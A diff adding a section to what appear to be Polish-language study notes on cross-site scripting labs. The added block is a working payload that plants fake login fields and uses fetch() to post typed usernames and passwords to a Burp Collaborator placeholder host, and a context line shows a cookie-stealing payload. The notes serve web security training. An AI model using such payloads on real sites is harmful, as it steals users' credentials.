@@ -242,6 +242,16 @@ body:document.cookie
 </script>
 ```
 
+## Lab: Exploiting cross-site scripting to capture passwords
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
 # DOM BASED XSS 
 
 Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą odpalone) 
